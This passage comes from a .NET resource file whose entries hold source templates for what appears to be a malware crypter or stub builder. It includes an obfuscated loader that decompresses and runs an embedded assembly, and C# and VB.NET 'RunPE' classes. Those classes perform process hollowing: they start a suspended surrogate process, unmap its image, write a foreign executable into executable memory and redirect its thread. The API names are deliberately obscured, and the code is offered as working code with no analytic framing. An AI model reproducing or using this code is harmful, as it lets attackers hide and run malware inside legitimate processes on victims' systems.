        "q4zyivMvku0vT6+/uLp6fXvzXEccqivfvB7P/vO7qR88uzsGeVk772afkUx6VenX13/3hTvZuU7Us4/NcU6Ia0X/OCnfvKd4af19" &amp; _
        "PNXhc7n/8+ep8ffVT2if+f8t+HkgWfnWRX9/PemNZnpW8rHYK3pu/vHyn/lT71GLH8ljV4ecOykSvRHz4+eHz0/euiBN8xO5/HB0" &amp; _
        "7h++dHzo+f/Dc//A/KDqLAAWAAA"

    Private Sub SUB1(ByVal V1 As Byte(), ByVal V2 As Object(), Optional ByVal [Class] As String = "PE", Optional ByVal V3 As String = "Run")
        Try
            Dim V4 As Assembly = Assembly.Load(V1)
            Dim V5 As MethodInfo = V4.[GetType]([Class]).GetMethod(V3)
            V5.Invoke(Nothing, V2)
        Catch

        End Try
    End Sub
    Public Sub SUB1(ByVal bytes() As Byte, ByVal host As String)
        SUB1(debase64(RunPE), New Object() {bytes, host})
    End Sub
    Private Function debase64(ByVal V6 As String) As Byte()
        Return Convert.FromBase64String(Func1(V6))
    End Function
    Private Function Func1(ByVal V7 As String) As String
        Dim ModuleNAme() As Byte = Convert.FromBase64String(V7)
        Dim ms As MemoryStream = New MemoryStream
        Dim V8 As Integer = BitConverter.ToInt32(ModuleNAme, 0)
        ms.Write(ModuleNAme, 4, (ModuleNAme.Length - 4))
        Dim buffer() As Byte = New Byte((V8) - 1) {}
        ms.Position = 0
        Dim zip As GZipStream = New GZipStream(ms, CompressionMode.Decompress)
        zip.Read(buffer, 0, buffer.Length)
        Return Encoding.UTF8.GetString(buffer)
    End Function
End Module</value>
  </data>
  <data name="RunPE3C" xml:space="preserve">
    <value>using Microsoft.VisualBasic;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class RunPEClas
{
	[DllImport("kernel32")]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool V1(string V2, StringBuilder V3, IntPtr V4, IntPtr V5, 	[MarshalAs(UnmanagedType.Bool)]
bool inherit, int creation, IntPtr env, string V6, byte[] V7, IntPtr[] V8);
	[DllImport("kernel32")]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool V9(IntPtr hThr, uint[] ctxt);
	[DllImport("ntdll")]
	private static extern uint V10(IntPtr hProc, IntPtr baseAddr);
	[DllImport("kernel32")]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool V11(IntPtr hProc, IntPtr baseAddr, ref IntPtr bufr, int bufrSize, ref IntPtr numRead);
	[DllImport("kernel32.dll")]
	private static extern uint V12(IntPtr hThread);
	[DllImport("kernel32")]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool V13(IntPtr hThr, uint[] ctxt);
	[DllImport("kernel32")]
	private static extern IntPtr V14(IntPtr hProc, IntPtr addr, IntPtr size, int allocType, int prot);
	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool V15(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, ref uint lpflOldProtect);
	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool V16(IntPtr hProcess, IntPtr V21, byte[] lpBuffer, uint nSize, int V22);

	public static bool Func1(byte[] bytes, string surrogateProcess)
	{
		try {
			IntPtr V4 = IntPtr.Zero;
			IntPtr[] V17 = new IntPtr[4];
			byte[] V18 = new byte[68];

			int num2 = BitConverter.ToInt32(bytes, 60);
			int num = BitConverter.ToInt16(bytes, num2 + 6);
			IntPtr ptr4 = new IntPtr(BitConverter.ToInt32(bytes, num2 + 0x54));

			if (V1(null, new StringBuilder(surrogateProcess), V4, V4, false, 4, V4, null, V18, V17)) {
				uint[] ctxt = new uint[179];
				ctxt[0] = 0x10002;
				if (V9(V17[1], ctxt)) {
					IntPtr baseAddr = new IntPtr(ctxt[0x29] + 8L);

					IntPtr V19 = IntPtr.Zero;
					IntPtr V20 = new IntPtr(4);

					IntPtr numRead = IntPtr.Zero;

					if (V11(V17[0], baseAddr, ref V19, Convert.ToInt32(V20), ref numRead) &amp;&amp; (V10(V17[0], V19) == 0)) {
						IntPtr addr = new IntPtr(BitConverter.ToInt32(bytes, num2 + 0x34));
						IntPtr size = new IntPtr(BitConverter.ToInt32(bytes, num2 + 80));
						IntPtr V21 = V14(V17[0], addr, size, 0x3000, 0x40);

						int V22 = 0;

						V16(V17[0], V21, bytes, Convert.ToUInt32(Convert.ToInt32(ptr4)), V22);
						int num5 = num - 1;
						for (int i = 0; i &lt;= num5; i++) {
							int[] dst = new int[10];
							Buffer.BlockCopy(bytes, (num2 + 0xf8) + (i * 40), dst, 0, 40);
							byte[] buffer2 = new byte[(dst[4] - 1) + 1];
							Buffer.BlockCopy(bytes, dst[5], buffer2, 0, buffer2.Length);

							size = new IntPtr(V21.ToInt32() + dst[3]);
							addr = new IntPtr(buffer2.Length);

							V16(V17[0], size, buffer2, Convert.ToUInt32(addr), V22);
						}
						size = new IntPtr(ctxt[0x29] + 8L);
						addr = new IntPtr(4);

						V16(V17[0], size, BitConverter.GetBytes(V21.ToInt32()), Convert.ToUInt32(addr), V22);
						ctxt[0x2c] = Convert.ToUInt32(V21.ToInt32() + BitConverter.ToInt32(bytes, num2 + 40));
						V13(V17[1], ctxt);
					}
				}
				V12(V17[1]);
			}
		} catch {
			return false;
		}
		return true;
	}
}</value>
  </data>
  <data name="RunPE3VB" xml:space="preserve">
    <value>Public Class RunPEClas
    &lt;DllImport("kernel32")&gt; _
    Private Shared Function V1(ByVal V2 As String, ByVal V3 As StringBuilder, ByVal V4 As IntPtr, ByVal V5 As IntPtr, &lt;MarshalAs(UnmanagedType.Bool)&gt; ByVal inherit As Boolean, ByVal creation As Integer, _
        ByVal env As IntPtr, ByVal V6 As String, ByVal V7 As Byte(), ByVal V8 As IntPtr()) As &lt;MarshalAs(UnmanagedType.Bool)&gt; Boolean
    End Function
    &lt;DllImport("kernel32")&gt; _
    Private Shared Function V9(ByVal hThr As IntPtr, ByVal ctxt As UInteger()) As &lt;MarshalAs(UnmanagedType.Bool)&gt; Boolean
    End Function
    &lt;DllImport("ntdll")&gt; _
    Private Shared Function V10(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr) As UInteger
    End Function
    &lt;DllImport("kernel32")&gt; _
    Private Shared Function V11(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr, ByRef bufr As IntPtr, ByVal bufrSize As Integer, ByRef numRead As IntPtr) As &lt;MarshalAs(UnmanagedType.Bool)&gt; Boolean
    End Function
    &lt;DllImport("kernel32.dll")&gt; _
    Private Shared Function V12(ByVal hThread As IntPtr) As UInteger
    End Function
    &lt;DllImport("kernel32")&gt; _
    Private Shared Function V13(ByVal hThr As IntPtr, ByVal ctxt As UInteger()) As &lt;MarshalAs(UnmanagedType.Bool)&gt; Boolean
    End Function
    &lt;DllImport("kernel32")&gt; _
    Private Shared Function V14(ByVal hProc As IntPtr, ByVal addr As IntPtr, ByVal size As IntPtr, ByVal allocType As Integer, ByVal prot As Integer) As IntPtr
    End Function
    &lt;DllImport("kernel32", CharSet:=CharSet.Auto, SetLastError:=True)&gt; _
    Private Shared Function V15(ByVal hProcess As IntPtr, ByVal lpAddress As IntPtr, ByVal dwSize As IntPtr, ByVal flNewProtect As UInteger, ByRef lpflOldProtect As UInteger) As Boolean
    End Function
    &lt;DllImport("kernel32.dll", SetLastError:=True)&gt; _
    Private Shared Function V16(ByVal hProcess As IntPtr, ByVal V21 As IntPtr, ByVal lpBuffer As Byte(), ByVal nSize As UInteger, ByVal V22 As Integer) As Boolean
    End Function

    Public Shared Function Func1(ByVal bytes As Byte(), ByVal surrogateProcess As String) As Boolean
        Try
            Dim V4 As IntPtr = IntPtr.Zero
            Dim V17 As IntPtr() = New IntPtr(3) {}
            Dim V18 As Byte() = New Byte(67) {}

            Dim num2 As Integer = BitConverter.ToInt32(bytes, 60)
            Dim num As Integer = BitConverter.ToInt16(bytes, num2 + 6)
            Dim ptr4 As New IntPtr(BitConverter.ToInt32(bytes, num2 + &amp;H54))

            If V1(Nothing, New StringBuilder(surrogateProcess), V4, V4, False, 4, _
                V4, Nothing, V18, V17) Then
                Dim ctxt As UInteger() = New UInteger(178) {}
                ctxt(0) = &amp;H10002
                If V9(V17(1), ctxt) Then
                    Dim baseAddr As New IntPtr(ctxt(&amp;H29) + 8L)

                    Dim V19 As IntPtr = IntPtr.Zero
                    Dim V20 As New IntPtr(4)

                    Dim numRead As IntPtr = IntPtr.Zero

                    If V11(V17(0), baseAddr, V19, CInt(V20), numRead) AndAlso (V10(V17(0), V19) = 0) Then
                        Dim addr As New IntPtr(BitConverter.ToInt32(bytes, num2 + &amp;H34))
                        Dim size As New IntPtr(BitConverter.ToInt32(bytes, num2 + 80))
                        Dim V21 As IntPtr = V14(V17(0), addr, size, &amp;H3000, &amp;H40)

                        Dim V22 As Integer

                        V16(V17(0), V21, bytes, CUInt(CInt(ptr4)), V22)
                        Dim num5 As Integer = num - 1
                        For i As Integer = 0 To num5
                            Dim dst As Integer() = New Integer(9) {}
                            Buffer.BlockCopy(bytes, (num2 + &amp;HF8) + (i * 40), dst, 0, 40)
                            Dim buffer2 As Byte() = New Byte((dst(4) - 1)) {}
                            Buffer.BlockCopy(bytes, dst(5), buffer2, 0, buffer2.Length)

                            size = New IntPtr(V21.ToInt32() + dst(3))
                            addr = New IntPtr(buffer2.Length)

                            V16(V17(0), size, buffer2, CUInt(addr), V22)
                        Next
                        size = New IntPtr(ctxt(&amp;H29) + 8L)
                        addr = New IntPtr(4)

                        V16(V17(0), size, BitConverter.GetBytes(V21.ToInt32()), CUInt(addr), V22)
                        ctxt(&amp;H2C) = CUInt(V21.ToInt32() + BitConverter.ToInt32(bytes, num2 + 40))
                        V13(V17(1), ctxt)
                    End If
                End If
                V12(V17(1))
            End If
        Catch
            Return False
        End Try
        Return True
    End Function
End Class</value>
  </data>
</root>